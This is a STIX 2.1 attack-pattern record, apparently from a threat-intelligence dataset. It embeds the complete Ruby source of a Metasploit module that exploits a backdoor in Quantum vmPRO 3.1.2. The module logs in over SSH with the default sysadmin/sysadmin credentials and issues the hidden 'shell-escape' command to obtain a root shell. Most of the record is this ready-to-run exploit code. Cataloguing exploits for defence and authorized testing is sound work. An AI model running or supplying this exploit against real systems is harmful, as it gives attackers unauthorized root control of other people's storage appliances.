{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b075a74a-d847-434c-8a7e-734d021e83fb",
    "created": "2024-08-14T16:58:02.111137Z",
    "modified": "2024-08-14T16:58:02.111142Z",
    "name": "Quantum vmPRO Backdoor Command",
    "description": " This module abuses a backdoor command in Quantum vmPRO. Any user, even one without admin privileges, can get access to the restricted SSH shell. By using the hidden backdoor \"shell-escape\" command it's possible to drop to a real root bash shell. This module has been tested successfully on Quantum vmPRO 3.1.2.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ssh/quantum_vmpro_backdoor.rb",
            "external_id": "quantum_vmpro_backdoor.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Quantum vmPRO Backdoor Command',\n        'Description' => %q{\n          This module abuses a backdoor command in Quantum vmPRO. Any user, even one without admin\n          privileges, can get access to the restricted SSH shell. By using the hidden backdoor\n          \"shell-escape\" command it's possible to drop to a real root bash shell. This module\n          has been tested successfully on Quantum vmPRO 3.1.2.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'xistence <xistence[at]0x90.nl>'  # Original discovery and Metasploit module\n        ],\n        'References' => [\n          ['PACKETSTORM', '125760']\n        ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Payload' => {\n          'Compat' => {\n            'PayloadType' => 'cmd_interact',\n            'ConnectionType' => 'find'\n          }\n        },\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Targets' => [\n          ['Quantum vmPRO 3.1.2', {}],\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2014-03-17',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RHOST(),\n        Opt::RPORT(22),\n        OptString.new('USER', [ true, 'vmPRO SSH user', 'sysadmin']),\n        OptString.new('PASS', [ true, 'vmPRO SSH password', 'sysadmin'])\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def do_login(user, pass)\n    opts = ssh_client_defaults.merge({\n      auth_methods: ['password', 'keyboard-interactive'],\n      port: rport,\n      password: pass\n    })\n\n    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    begin\n      ssh = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh = Net::SSH.start(rhost, user, opts)\n      end\n    rescue Rex::ConnectionError\n      return nil\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{rhost}:#{rport} SSH - Disconnected during negotiation\"\n      return nil\n    rescue ::Timeout::Error\n      print_error \"#{rhost}:#{rport} SSH - Timed out during negotiation\"\n      return nil\n    rescue Net::SSH::AuthenticationFailed\n      print_error \"#{rhost}:#{rport} SSH - Failed authentication\"\n      return nil\n    rescue Net::SSH::Exception => e\n      print_error \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\"\n      return nil\n    end\n\n    if ssh\n      conn = Net::SSH::CommandStream.new(ssh, 'shell-escape')\n      return conn\n    end\n\n    return nil\n  end\n\n  def exploit\n    user = datastore['USER']\n    pass = datastore['PASS']\n\n    print_status(\"#{rhost}:#{rport} - Attempt to login...\")\n    conn = do_login(user, pass)\n    if conn\n      print_good(\"#{rhost}:#{rport} - Login Successful ('#{user}:#{pass})\")\n      handler(conn.lsock)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-17",
    "x_mitre_platforms": [
        "unix'"
    ]
}